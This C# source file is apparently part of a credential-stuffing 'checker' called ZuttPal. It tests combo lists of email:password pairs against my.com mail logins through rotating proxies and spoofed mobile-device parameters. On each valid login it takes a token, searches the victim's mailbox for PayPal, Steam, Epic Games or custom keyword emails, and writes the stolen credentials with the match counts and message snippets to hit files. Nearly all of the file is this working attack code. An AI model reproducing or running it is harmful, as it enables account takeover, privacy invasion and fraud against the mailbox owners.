using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check37
	{
		public static string Path;
		public static string Path1;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker2()
		{
			for (; ; )
			{
				while (!Checking41.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking41.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking41.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.AllowAutoRedirect = false;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								string str = httpRequest.Get("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + array[0] + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + array[1] + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&").ToString();
								if (str.Contains("Ok=1") || str.Contains("Ok= 1"))
								{
									string subjectpaypal = "";
									string subjectsteam = "";
									string subjectepic = "";
									var post = WebUtility.UrlDecode("https://aj-https.my.com/api/v1/tokens?email=" + array[0] + "&mp=android&mmp=mail&DeviceID=b932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9&client=mobile&udid=32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9fa8d9287dc335bfd9e09abd6&instanceid=cRYT1qjfiKE&playservices=202614037&connectid=9d4527fca2ee1717352c7dfd339a86a8&os=Android&osversion=10&ver=com.my.mail12.8.0.30440&appbuild=30440&vendor=Xiaomi&model=MI8Lite&devicetype=Smartphone&country=BR&language=ptBR&timezone=GMT-03:00&devicename=XiaomiMI8Lite&idfa=142b1b43-88ee-4a6e-9b84-0472623d63b5&appsflyerid=1596761345723-8129751771213333860&current=google&first=google&md5signature=feff7cbcf5bd717fbf3dedc617a0adbf");
									string dogge = httpRequest.Get(post).ToString();
									string token = yey(dogge, "token\":\"", "\"");
									if (Checking41.preadded == "True")
									{
										var dog = WebUtility.UrlDecode("https://aj-https.my.com/api/v1/messages/search?htmlencoded=false&limit=1&offset=0&query=@paypal.com&snippet_limit=277&with_threads=true&email=" + array[0] + "&mp=android&mmp=mail&DeviceID=b932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9&client=mobile&udid=32n3AfVM36ugBczzdtwkxC6Rai1so3ajf987dc335bfd9e09abd6&instanceid=cRYT1qjfiKE&playservices=202614037&connectid=9d4527fca2ee1717352c7dfd339a86a8&os=Android&os_version=10&ver=com.my.mail12.8.0.30440&appbuild=30440&vendor=Xiaomi&model=MI8Lite&device_type=Smartphone&country=BR&language=pt_BR&timezone=GMT-03:00&device_name=XiaomiMI8Lite&idfa=142b1b43-88ee-4a6e-9b84-0472623d63b5&device_year=2014&connection_class=UNKNOWN&current=google&first=google&behaviorName=default+stickers&appsflyerid=1596761345723-8129751771213333860&reqmode=fg&ExperimentID=Experiment_simple_signin&isExperiment=false&token=" + token + "&md5_signature=efb24052d8bed655df0e291e3c5af6dc");
										string paypal = httpRequest.Get(dog).ToString();
										string paypalmails = yey(paypal, "count\":", ",");
										if (paypalmails == "0")
										{
											paypalempty = "True";
										}
										else
										{
											Interlocked.Increment(ref Checking41.paypal);
											if (Checking41.savesubject == "True")
											{
												subjectpaypal = yey(paypal, "snippet\":\"", "\",\"search_snippet");
											}
										}
										var cat = WebUtility.UrlDecode("https://aj-https.my.com/api/v1/messages/search?htmlencoded=false&limit=1&offset=0&query=epicgames.com&snippet_limit=277&with_threads=true&email=" + array[0] + "&mp=android&mmp=mail&DeviceID=b932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9&client=mobile&udid=32n3AfVM36ugBczzdtwkxC6Rai1so3ajf95bfd9e09abd6&instanceid=cRYT1qjfiKE&playservices=202614037&connectid=9d4527fca2ee1717352c7dfd339a86a8&os=Android&os_version=10&ver=com.my.mail12.8.0.30440&appbuild=30440&vendor=Xiaomi&model=MI8Lite&device_type=Smartphone&country=BR&language=pt_BR&timezone=GMT-03:00&device_name=XiaomiMI8Lite&idfa=142b1b43-88ee-4a6e-9b84-0472623d63b5&device_year=2014&connection_class=UNKNOWN&current=google&first=google&behaviorName=default+stickers&appsflyerid=1596761345723-8129751771213333860&reqmode=fg&ExperimentID=Experiment_simple_signin&isExperiment=false&token=" + token + "&md5_signature=efb24052d8bed655df0e291e3c5af6dc");
										string epicgames = httpRequest.Get(cat).ToString();
										string epicgamesmails = yey(epicgames, "count\":", ",");
										if (epicgamesmails == "0")
										{
											epicempty = "True";
										}
										else
										{
											Interlocked.Increment(ref Checking41.fortnite);
											if (Checking41.savesubject == "True")
											{
												subjectepic = yey(epicgames, "snippet\":\"", "\",\"search_snippet");
											}
										}
										var bird = WebUtility.UrlDecode("https://aj-https.my.com/api/v1/messages/search?htmlencoded=false&limit=1&offset=0&query=@steampowered.com&snippet_limit=277&with_threads=true&email=" + array[0] + "&mp=android&mmp=mail&DeviceID=b932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9&client=mobile&udid=32n3AfVM36ugBczzdtwkxC6Rai1so3ajf909abd6&instanceid=cRYT1qjfiKE&playservices=202614037&connectid=9d4527fca2ee1717352c7dfd339a86a8&os=Android&os_version=10&ver=com.my.mail12.8.0.30440&appbuild=30440&vendor=Xiaomi&model=MI8Lite&device_type=Smartphone&country=BR&language=pt_BR&timezone=GMT-03:00&device_name=XiaomiMI8Lite&idfa=142b1b43-88ee-4a6e-9b84-0472623d63b5&device_year=2014&connection_class=UNKNOWN&current=google&first=google&behaviorName=default+stickers&appsflyerid=1596761345723-8129751771213333860&reqmode=fg&ExperimentID=Experiment_simple_signin&isExperiment=false&token=" + token + "&md5_signature=efb24052d8bed655df0e291e3c5af6dc");
										string steam = httpRequest.Get(bird).ToString();
										string steamgames = yey(steam, "count\":", ",");
										if (steamgames == "0")
										{
											steamempty = "True";
										}
										else
										{
											Interlocked.Increment(ref Checking41.steam);
											if (Checking41.savesubject == "True")
											{
												subjectsteam = yey(steam, "snippet\":\"", "\",\"search_snippet");
											}
										}
										string keyword1subject = "";
										string keyword1 = "";
										string emptykeyword1 = "";
										if (Checking41.usekeyword == "True")
										{
											var key1 = WebUtility.UrlDecode("https://aj-https.my.com/api/v1/messages/search?htmlencoded=false&limit=1&offset=0&query=" + Checking41.keyword1 + "&snippet_limit=277&with_threads=true&email=" + array[0] + "&mp=android&mmp=mail&DeviceID=b932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9&client=mobile&udid=32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9&instanceid=cRYT1qjfiKE&playservices=202614037&connectid=9d4527fca2ee1717352c7dfd339a86a8&os=Android&os_version=10&ver=com.my.mail12.8.0.30440&appbuild=30440&vendor=Xiaomi&model=MI8Lite&device_type=Smartphone&country=BR&language=pt_BR&timezone=GMT-03:00&device_name=XiaomiMI8Lite&idfa=142b1b43-88ee-4a6e-9b84-0472623d63b5&device_year=2014&connection_class=UNKNOWN&current=google&first=google&behaviorName=default+stickers&appsflyerid=1596761345723-8129751771213333860&reqmode=fg&ExperimentID=Experiment_simple_signin&isExperiment=false&token=" + token + "&md5_signature=efb24052d8bed655df0e291e3c5af6dc");
											string key1get = httpRequest.Get(key1).ToString();
											keyword1 = yey(key1get, "count\":", ",");
											if (keyword1 == "0")
											{
												emptykeyword1 = "YES";
											}
											else
											{
												if (Checking41.savesubject == "True")
												{
													keyword1subject = yey(key1get, "snippet\":\"", "\",\"search_snippet");
												}
											}
										}
										Interlocked.Increment(ref Checking41.CheckedLines);
										Interlocked.Increment(ref Checking41.currentCpm);
										Interlocked.Increment(ref Checking41.Hits);
										string capture = "";
										string savepaypal = "";
										string savesteam = "";
										string saveepic = "";
										string savekeyword1 = "";
										if (Checking41.savesubject == "True")
										{
											capture = $"{account} - [Paypal Mails: {paypalmails} | Steam Emails: {steamgames} | Epic Games Emails: {epicgamesmails}]";
											savepaypal = $"{account} - [Paypal Mails: {paypalmails} | Subjects: {subjectpaypal}]";
											savesteam = $"{account} - [Steam Emails: {steamgames} | Subjects: {subjectsteam}]";
											saveepic = $"{account} - [Epic Games Emails: {epicgamesmails} | Subjects: {subjectepic}]";
											if (Checking41.usekeyword == "True")
											{
												savekeyword1 = $"{account} - {Checking41.keyword1} Emails: {keyword1} - Subjects: {keyword1subject}";
											}
											Save(Path + "\\Hits.txt", capture);
											Save(Path1 + "\\Paypal.txt", savepaypal);
											Save(Path1 + "\\Steam.txt", savesteam);
											Save(Path1 + "\\EpicGames.txt", saveepic);
											if (Checking41.usekeyword == "True")
											{
												Save(Path1 + $"\\{Checking41.keyword1}.txt", savekeyword1);
											}
											if (Program.config.printgood == "True")
											{
												Console.WriteLine("[»] Valid - " + capture, Color.Green);
											}
											break;
										}
										else if (Checking41.savesubject == "False")
										{
											capture = $"{account} - [Paypal Mails: {paypalmails} | Steam Emails: {steamgames} | Epic Games Emails: {epicgamesmails}]";
											savepaypal = $"{account} - [Paypal Mails: {paypalmails}]";
											savesteam = $"{account} - [Steam Emails: {steamgames}]";
											saveepic = $"{account} - [Epic Games Emails: {epicgamesmails}]";
											if (Checking41.usekeyword == "True")
											{
												savekeyword1 = $"{account} - {Checking41.keyword1} Emails: {keyword1}";
											}
											Save(Path + "\\Hits.txt", capture);
											Save(Path1 + "\\Paypal.txt", savepaypal);
											Save(Path1 + "\\Steam.txt", savesteam);
											Save(Path1 + "\\EpicGames.txt", saveepic);
											if (Checking41.usekeyword == "True")
											{
												Save(Path1 + $"\\{Checking41.keyword1}.txt", savekeyword1);
											}
											if (Program.config.printgood == "True")
											{
												Console.WriteLine("[»] Valid - " + capture, Color.Green);
											}
											break;
										}
									}
									else if (Checking41.preadded == "False")
                                    {
										string capture = "";
										string savepaypal = "";
										string savesteam = "";
										string saveepic = "";
										string savekeyword1 = "";
										string keyword1subject = "";
										string keyword1 = "";
										string emptykeyword1 = "";
										if (Checking41.usekeyword == "True")
										{
											var key1 = WebUtility.UrlDecode("https://aj-https.my.com/api/v1/messages/search?htmlencoded=false&limit=1&offset=0&query=" + Checking41.keyword1 + "&snippet_limit=277&with_threads=true&email=" + array[0] + "&mp=android&mmp=mail&DeviceID=b932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9&client=mobile&udid=32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9&instanceid=cRYT1qjfiKE&playservices=202614037&connectid=9d4527fca2ee1717352c7dfd339a86a8&os=Android&os_version=10&ver=com.my.mail12.8.0.30440&appbuild=30440&vendor=Xiaomi&model=MI8Lite&device_type=Smartphone&country=BR&language=pt_BR&timezone=GMT-03:00&device_name=XiaomiMI8Lite&idfa=142b1b43-88ee-4a6e-9b84-0472623d63b5&device_year=2014&connection_class=UNKNOWN&current=google&first=google&behaviorName=default+stickers&appsflyerid=1596761345723-8129751771213333860&reqmode=fg&ExperimentID=Experiment_simple_signin&isExperiment=false&token=" + token + "&md5_signature=efb24052d8bed655df0e291e3c5af6dc");
											string key1get = httpRequest.Get(key1).ToString();
											keyword1 = yey(key1get, "count\":", ",");
											if (keyword1 == "0")
											{
												emptykeyword1 = "YES";
											}
											else
											{
												if (Checking41.savesubject == "True")
												{
													keyword1subject = yey(key1get, "snippet\":\"", "\",\"search_snippet");
												}
											}
										}
										Interlocked.Increment(ref Checking41.CheckedLines);
										Interlocked.Increment(ref Checking41.currentCpm);
										Interlocked.Increment(ref Checking41.Hits);
										if (Checking41.savesubject == "True")
										{
											capture = $"{account} - [{Checking41.keyword1} Mails: {keyword1}]";
											if (Checking41.usekeyword == "True")
											{
												savekeyword1 = $"{account} - [{Checking41.keyword1} Emails: {keyword1} | Subjects: {keyword1subject}]";
											}
											Save(Path + "\\Hits.txt", capture);
											if (Checking41.usekeyword == "True")
											{
												Save(Path1 + $"\\{Checking41.keyword1}.txt", savekeyword1);
											}
											if (Program.config.printgood == "True")
											{
												Console.WriteLine("[»] Valid - " + capture, Color.Green);
											}
											break;
										}
										else if (Checking41.savesubject == "False")
										{
											capture = $"{account} - [{Checking41.keyword1} Mails: {keyword1}]";
											if (Checking41.usekeyword == "True")
											{
												savekeyword1 = $"{account} - [{Checking41.keyword1} Emails: {keyword1}]";
											}
											Save(Path + "\\Hits.txt", capture);
											if (Checking41.usekeyword == "True")
											{
												Save(Path1 + $"\\{Checking41.keyword1}.txt", savekeyword1);
											}
											if (Program.config.printgood == "True")
											{
												Console.WriteLine("[»] Valid - " + capture, Color.Green);
											}
											break;
										}
									}
									
								}
								else if (str.Contains("Ok=0"))
								{
									Interlocked.Increment(ref Checking41.CheckedLines);
									Interlocked.Increment(ref Checking41.currentCpm);
									Interlocked.Increment(ref Checking41.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.Red);
									}
									break;
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking41.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking41.retry);
								break;
							}
						}
					}
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string paypalempty = "";

		public static string epicempty = "";

		public static string steamempty = "";

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
